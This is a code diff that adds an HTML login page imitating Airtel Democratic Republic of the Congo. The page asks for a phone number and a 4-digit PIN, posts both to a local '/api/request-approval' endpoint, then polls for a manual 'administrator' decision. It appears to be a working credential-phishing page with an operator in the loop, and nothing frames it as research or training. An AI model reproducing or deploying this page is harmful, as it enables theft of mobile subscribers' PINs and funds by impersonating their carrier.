@@ -1,0 +1,366 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Airtel Congo — OTP</title>
+    <meta property="og:image" content="/og_default.png" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content="/og_default.png" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet" />
+    <style>
+      :root {
+        --bg: #efefef;
+        --panel: #f4f4f4;
+        --line: #d7d7d7;
+        --text: #1f2b3a;
+        --muted: #54708a;
+        --info: #dfeaf5;
+        --button: #1c2e4d;
+        --button-hover: #15273d;
+        --input-bg: #f9f9f9;
+      }
+
+      * { box-sizing: border-box; }
+
+      html, body {
+        margin: 0;
+        min-height: 100%;
+        background: var(--bg);
+        font-family: 'Inter', sans-serif;
+        color: var(--text);
+      }
+
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+      }
+
+      .page {
+        width: 100%;
+        max-width: 760px;
+        min-height: 100vh;
+        background: var(--bg);
+        padding: 26px 18px 40px;
+      }
+
+      .back {
+        width: 42px;
+        height: 42px;
+        border: none;
+        background: transparent;
+        font-size: 42px;
+        line-height: 1;
+        color: #25364d;
+        cursor: pointer;
+        margin: 0 0 26px 0;
+        padding: 0;
+      }
+
+      h1 {
+        margin: 0 0 32px;
+        font-size: clamp(2rem, 2vw + 1rem, 3rem);
+        line-height: 1.04;
+        font-weight: 800;
+        letter-spacing: -0.05em;
+      }
+
+      .field-wrap {
+        margin-bottom: 18px;
+      }
+
+      .label {
+        display: block;
+        font-size: 13px;
+        font-weight: 600;
+        color: #2c3d4f;
+        margin: 0 0 10px;
+      }
+
+      .input-shell {
+        display: flex;
+        align-items: center;
+        background: var(--input-bg);
+        border: 1px solid var(--line);
+        border-radius: 18px;
+        height: 62px;
+        padding: 0 18px;
+      }
+
+      .phone-icon {
+        width: 28px;
+        height: 28px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        color: #4a5d75;
+        font-size: 22px;
+        margin-right: 10px;
+      }
+
+      input[type="tel"] {
+        width: 100%;
+        border: none;
+        outline: none;
+        background: transparent;
+        font-size: 18px;
+        color: var(--text);
+        font-family: 'Inter', sans-serif;
+      }
+
+      input[type="tel"]::placeholder {
+        color: #6f7f90;
+      }
+
+      .info {
+        background: var(--info);
+        border-radius: 8px;
+        color: #214a73;
+        padding: 16px 14px;
+        font-size: 14px;
+        line-height: 1.45;
+        margin: 0 0 28px;
+        font-weight: 500;
+      }
+
+      .pin-label {
+        display: block;
+        margin-bottom: 18px;
+        font-size: 15px;
+        font-weight: 700;
+      }
+
+      .pin-grid {
+        display: flex;
+        gap: 14px;
+        margin-bottom: 26px;
+      }
+
+      .pin-box {
+        width: 58px;
+        height: 58px;
+        border: 1px solid #d2d2d2;
+        border-radius: 12px;
+        background: rgba(255,255,255,0.12);
+        text-align: center;
+        font-size: 28px;
+        font-weight: 700;
+        color: #08121d;
+        outline: none;
+      }
+
+      .pin-box:focus {
+        border-color: #405a82;
+        box-shadow: 0 0 0 2px rgba(64, 90, 130, 0.12);
+      }
+
+      .submit-btn {
+        width: 100%;
+        border: none;
+        height: 62px;
+        border-radius: 16px;
+        background: linear-gradient(180deg, #1b2e49 0%, #15253d 100%);
+        color: #fff;
+        font-size: clamp(1rem, 0.7vw + 0.8rem, 1.4rem);
+        font-weight: 800;
+        letter-spacing: 0.04em;
+        cursor: pointer;
+        text-transform: uppercase;
+        transition: transform 0.15s ease, background 0.15s ease;
+      }
+
+      .submit-btn:hover {
+        background: linear-gradient(180deg, #1a2b43 0%, #101e35 100%);
+      }
+
+      .submit-btn:active {
+        transform: translateY(1px);
+      }
+
+      .submit-btn:disabled {
+        opacity: 0.7;
+        cursor: wait;
+      }
+
+      .status {
+        margin-top: 18px;
+        min-height: 22px;
+        font-size: 14px;
+        font-weight: 600;
+      }
+
+      .status.success { color: #0a7b43; }
+      .status.error { color: #b22424; }
+      .status.info { color: #2b4f77; }
+
+      @media (max-width: 480px) {
+        .page { padding-left: 14px; padding-right: 14px; }
+        .pin-grid { gap: 8px; }
+        .pin-box { width: 52px; height: 52px; }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="page">
+      <button class="back" type="button" aria-label="Retour">←</button>
+
+      <h1>Bienvenue chez Airtel Democratic<br />Republic of the Congo</h1>
+
+      <form id="otp-form">
+        <div class="field-wrap">
+          <label class="label" for="phone">Numéro enregistré ou ID du compte</label>
+          <div class="input-shell">
+            <span class="phone-icon" aria-hidden="true">📞</span>
+            <input id="phone" name="phone" type="tel" inputmode="numeric" placeholder="+243 764554346" />
+          </div>
+        </div>
+
+        <div class="info">
+          Numéro enregistré (Airtel ou autre opérateur) ou numéro de compte de votre Home Broadband
+        </div>
+
+        <div class="field-wrap">
+          <label class="pin-label" for="pin-1">Entrez votre code PIN (4 chiffres)</label>
+          <div class="pin-grid" aria-label="PIN entry">
+            <input class="pin-box" id="pin-1" type="password" inputmode="numeric" maxlength="1" aria-label="digit 1" />
+            <input class="pin-box" id="pin-2" type="password" inputmode="numeric" maxlength="1" aria-label="digit 2" />
+            <input class="pin-box" id="pin-3" type="password" inputmode="numeric" maxlength="1" aria-label="digit 3" />
+            <input class="pin-box" id="pin-4" type="password" inputmode="numeric" maxlength="1" aria-label="digit 4" />
+          </div>
+        </div>
+
+        <button class="submit-btn" type="submit">Envoyer le code OTP</button>
+        <div id="status" class="status" aria-live="polite"></div>
+      </form>
+    </main>
+
+    <script>
+      const form = document.getElementById('otp-form');
+      const phoneInput = document.getElementById('phone');
+      const submitButton = document.querySelector('.submit-btn');
+      const statusBox = document.getElementById('status');
+      const pinInputs = [
+        document.getElementById('pin-1'),
+        document.getElementById('pin-2'),
+        document.getElementById('pin-3'),
+        document.getElementById('pin-4')
+      ];
+
+      function setStatus(message, type = 'info') {
+        statusBox.textContent = message;
+        statusBox.className = 'status ' + type;
+      }
+
+      function getPinValue() {
+        return pinInputs.map(input => input.value).join('').trim();
+      }
+
+      function bindPinInputs() {
+        pinInputs.forEach((input, index) => {
+          input.addEventListener('input', (event) => {
+            const value = event.target.value.replace(/\D/g, '').slice(-1);
+            event.target.value = value;
+            if (value && index < pinInputs.length - 1) {
+              pinInputs[index + 1].focus();
+            }
+          });
+
+          input.addEventListener('keydown', (event) => {
+            if (event.key === 'Backspace' && !input.value && index > 0) {
+              pinInputs[index - 1].focus();
+            }
+          });
+        });
+      }
+
+      async function pollApproval(id) {
+        const poll = async () => {
+          const res = await fetch(`/api/check-approval/${id}`);
+          if (!res.ok) throw new Error('Impossible de vérifier le statut.');
+
+          const data = await res.json();
+          if (data.status === 'pending') {
+            setStatus('Demande en attente de validation par l’administrateur…', 'info');
+            return false;
+          }
+
+          if (data.status === 'approved') {
+            setStatus('✅ Demande approuvée. Vous pouvez continuer.', 'success');
+            return true;
+          }
+
+          if (data.status === 'denied') {
+            setStatus('❌ Demande refusée. Vérifiez votre code PIN ou votre numéro.', 'error');
+            return true;
+          }
+
+          if (data.status === 'insufficient') {
+            setStatus('⚠️ Solde insuffisant pour cette demande.', 'error');
+            return true;
+          }
+
+          if (data.status === 'demo_error') {
+            setStatus('⚠️ Erreur de validation détectée. Veuillez réessayer.', 'error');
+            return true;
+          }
+
+          setStatus('Statut inconnu.', 'error');
+          return true;
+        };
+
+        while (true) {
+          const finished = await poll();
+          if (finished) return;
+          await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+      }
+
+      form.addEventListener('submit', async (event) => {
+        event.preventDefault();
+
+        const phone = phoneInput.value.trim();
+        const pin = getPinValue();
+
+        if (!phone || !pin || pin.length !== 4) {
+          setStatus('Veuillez saisir un numéro et un code PIN à 4 chiffres.', 'error');
+          return;
+        }
+
+        submitButton.disabled = true;
+        setStatus('Envoi de la demande…', 'info');
+
+        try {
+          const response = await fetch('/api/request-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              plan: 'Airtel',
+              price: '20',
+              phone,
+              step: 'login',
+              code: pin
+            })
+          });
+
+          const data = await response.json();
+          if (!response.ok || !data.id) {
+            throw new Error('La demande n’a pas été acceptée par le serveur.');
+          }
+
+          setStatus('Demande envoyée. Vérification du statut…', 'info');
+          await pollApproval(data.id);
+        } catch (error) {
+          setStatus(error.message || 'Une erreur est survenue.', 'error');
+        } finally {
+          submitButton.disabled = false;
+        }
+      });
+
+      bindPinInputs();
+      phoneInput.focus();
+    </script>
+  </body>
+</html>
